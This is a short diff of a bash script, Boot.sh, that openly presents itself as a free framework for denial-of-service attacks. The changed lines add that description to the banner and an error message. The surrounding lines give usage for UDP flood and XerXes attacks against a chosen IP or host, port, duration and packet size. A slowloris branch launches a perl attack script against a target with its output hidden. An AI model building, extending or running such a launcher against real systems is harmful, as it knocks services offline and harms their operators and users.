@@ -39,7 +39,7 @@ echo -e "${IRed}
       ░                              ░                   
 ${Color_Off}"
 echo ""
-echo -e "${IGreen}Welcome to Boot.sh;"
+echo -e "${IGreen}Welcome to Boot.sh; This is a simple, free, open-source Framework for DoS Attacks."
 echo ""
 echo -e "Usage Raw UDP: ${Red}./boot.sh rawudp [ip] [port] [time] [size] [invisible (1/0)]${IGreen}"
 echo -e "Usage XerXes: ${Red}./boot.sh xerxes [hostname] [port] [time] [invisible (1/0)]${IGreen}"
@@ -167,6 +167,7 @@ if [ $1 == 'slowloris' ]
 				then
 					timeout $4 perl s -dns $2 -port $3 > /dev/null 2>&1
 			else
+				echo "please put 0 or 1 (0=no, 1=yes), defaulting to 0"
 				exit
 			fi
 		fi
